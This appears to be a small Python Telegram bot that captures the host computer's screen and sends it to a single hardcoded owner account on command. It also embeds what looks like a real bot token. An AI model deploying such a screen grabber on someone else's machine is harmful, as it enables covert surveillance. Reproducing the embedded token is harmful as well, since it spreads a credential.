import telebot
from PIL import Image, ImageGrab
from telebot import types


bot = telebot.TeleBot('5454616699:AAH5wNICmXp6E5rIhfDMeIHuDVY-oM2_lY4')
my_id = 734916032


def get_screenshort():
    img = ImageGrab.grab()
    return img


@bot.message_handler(commands=["start"])
def start(m, res=False):
    if m.from_user.id == my_id:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        item1 = types.KeyboardButton("Скрин")
        item2 = types.KeyboardButton("TEST")
        markup.add(item1)
        markup.add(item2)
        bot.send_message(m.chat.id, 'Прием. На связи', reply_markup=markup)
    else:
        bot.send_message(m.chat.id, 'Доступ запрещен')


# Получение сообщений от юзера
@bot.message_handler(content_types=["text"])
def handle_text(message):
    if message.from_user.id == my_id:
        if message.text == 'живой?':
            bot.send_message(message.chat.id, 'Я живой')
        if message.text == 'Скрин':
            bot.send_photo(message.chat.id, photo=get_screenshort())
    else:
        bot.send_message(message.chat.id, 'Доступ запрещен')


# Запускаем бота
bot.polling(none_stop=True, interval=0)
